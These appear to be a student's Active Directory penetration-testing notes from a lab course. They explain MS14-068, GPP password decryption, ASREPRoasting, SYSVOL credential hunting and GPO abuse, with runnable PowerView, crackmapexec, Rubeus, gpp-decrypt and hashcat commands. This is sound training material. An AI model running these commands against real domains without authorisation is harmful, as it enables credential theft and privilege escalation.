This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.

## Sniffing LDAP Credentials
Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).
## Enumerating DNS Records
We can use [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in an Active Directory domain using a valid user account. This is useful when hostnames are non-descriptive (e.g., `SRV01934.INLANEFREIGHT.LOCAL`) because DNS entries may reveal meaningful names like `JENKINS.INLANEFREIGHT.LOCAL`, helping us plan attacks.

By default, all domain users can list DNS zone objects, but standard LDAP queries won’t return all results. `adidnsdump` resolves all records, making it easier to find interesting targets.

The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

```bash
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC-IP> 
cat records.csv  

# ? some records are blank, namely `?,`.
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC-IP> -r # resolve unknown records
```
## Other Misconfigurations
There are many other misconfigurations that can be used to further your access within a domain.
### Password in Description Field
Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView
 **Finding Passwords in the Description Field using Get-Domain User**
```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
  # ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```
### PASSWD_NOTREQD Field
It is possible to come across domain accounts with the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute (  **bitwise flags** ex. `0x0020` Password is not required )
This means the account **doesn’t have to follow password length rules** and could have a very short or even **blank password** (if allowed).
This flag may be:
- Set **intentionally** (e.g., admins avoiding after-hours resets)
- Set **accidentally** (e.g., pressing enter when changing a password in CLI)
- Left over from **software installation**
**Checking for PASSWD_NOTREQD Setting using Get-DomainUser** (Powerview)
```powershell

Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
### 1-Credentials in SMB Shares and SYSVOL Scripts
The SYSVOL share is accessible to all authenticated users and often contains batch, VBScript, or PowerShell scripts. These may include old or active credentials, making it a valuable spot for password hunting. Always review this directory for sensitive information, like the `reset_local_admin_pass.vbs` script in this example.
###### Discovering an Interesting Script:
```powershell
ls \\<DC-HOST-NAME>\SYSVOL\<DOMAIN.LOCAL>\scripts
   # daily-runs.zip  disable-nbtns.ps Logon Banner.htm reset_local_admin_pass.vbs  
```
###### Finding a Password in the Script:
Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux` section.
```powershell
cat \\<DC-HOST-NAME>\SYSVOL\<DOMAIN.LOCAL>\scriptsreset_local_admin_pass.vbs
  # sUser = "Administrator"
  # sPwd = "!ILFREIGHT_L0cALADmin!"
  
  crackmapexec smb <TARGETS> -u <USER> -p '<PASS>' --local-auth
  # <TARGETS> = subnet or file containing a list of hosts.
```
### 2- Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

**MS14-025** (2014) patched a GPP flaw that allowed privilege escalation via stored passwords. The patch stops new password storage but doesn’t remove old `Groups.xml` files in SYSVOL. Deleting a GPP policy (instead of unlinking it) leaves cached copies on local machines.

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

###### find the Group Policy Preferences passwords (GPP)

  - Search/browse `SYSVOL` share for `<File>.xml` files.
  - on`Registry.xml` : ==Clear Text Password== , used for  computers automatically log in at boot  . This is a separate issue from GPP passwords.
  - Use tools like:
    - [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
    - GPP Metasploit Post Module
    - Other Python/Ruby scripts.
    - **CrackMapExec**: Has modules to find & decrypt GPP passwords.
- **Tip**:
    - GPP passwords often belong to **legacy accounts** (locked/deleted).
    - Even if old, try **password spraying** with recovered passwords (password reuse is common).

###### Viewing File.xml
![[Pasted image 20250830155212.png]]
###### Decrypting the Password with gpp-decrypt
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE #=> password1
```
**Find Using CrackMapExec**
```bash
# find gpp with CrackMapExec
crackmapexec smb -L | grep gpp
# [*] gpp_autologin   Searches the domain controller for registry.xml to find autologon information and returns the username and password.
# [*] gpp_password     Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.


# find autologon creds (Registry.xml so CLear text PASSWORD)
crackmapexec smb <DC-ip> -u <USER> -p <PASS> -M gpp_autologin

# find plaintext creds through Group Policy Preferences
crackmapexec smb <DC-ip> -u <USER> -p <PASS> -M gpp_password
```

- Credentials are **probably local admin** → check all hosts for local admin access .![[Pasted image 20250830162629.png]]
- Could also be:
    - Highly privileged account.
    - Disabled account or Expired/unused credentials : 
        - password re-use: Perform **==Local/Domain== password spraying** 
    
### 3- ASREPRoasting
Accounts with **“Do not require Kerberos pre-authentication”** allow anyone to request a TGT. The **AS-REP** from the Domain Controller contains the TGT encrypted with the user’s password. Normally, pre-authentication requires the user to encrypt a timestamp with their password for validation. Without pre-auth, an attacker can capture the AS-REP and perform **offline password cracking** using tools like Hashcat or John the Ripper.

>we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.

> we can't use the TGT in the AS-RESP coz to get the TGS we need  Dycrept Session Key  with the TGT
> AS-RESP= TGT(enc:krbtgt)+ session key (enc: user nt hash)
> TGS-REQ=TGT(enc:krbtgt)+==Session key(Dycrepted)==

![[Pasted image 20250830164812.png]]
- ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
- The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account.
- ==If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again==
###### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
######  Retrieving AS-REP in Proper Format using Rubeus
This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth
```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
###### Cracking the Hash Offline with Hashcat
```bash
 hashcat -m 18200 <domain_asrep> /usr/share/wordlists/rockyou.txt 
```
###### Retrieving the AS-REP Using Kerbrute (auto enum+ retrieve)
When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
```bash
kerbrute userenum -d <domain.local> --dc <DC-IP> /opt/jsmith.txt 
```
######  Using  GetNPUsers Hunting for Users with Kerberos Pre-auth Not Required
we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool
### 3-Group Policy Object (GPO) Abuse
Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can enumerate GPO information using  PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.

##### Enumerating GPO Names with PowerView
```powershell
Get-DomainGPO |select displayname
  # Deny CMD Access
  # Service Accounts Password Policy
  # AutoLogon
  # AutoLogon
```
[+] ==types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain.==
##### Enumerating GPO Names with a Built-In Cmdlet
```powershell
Get-GPO -All | Select DisplayName
```

##### Enumerating Domain User GPO Rights
Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.
```powershell
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
# SecurityIdentifier (who has the right)
# ObjectDN (Destination (object the right applies to) : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
# ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
```

[+] Here we can see that the Domain Users group has various permissions over a **GPO object**.==(CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL)== , such as `WriteProperty` and `WriteDacl`, which we could leverage to ==give ourselves full control over the GPO and pull off any number of attacks== that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.
##### Using BloodHound 
Checking in BloodHound,**Group Delegation Object  Control**:
we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.
![[Pasted image 20250830180340.png]]

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.![[Pasted image 20250830181018.png]]

##### Abuse 
We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions
- **Possible Actions:**
    - Add a controlled user to **Local Admins** on a target host.
    - Create an **immediate scheduled task** to get a reverse shell.
    - Configure a **malicious computer startup script** to get a reverse shell.

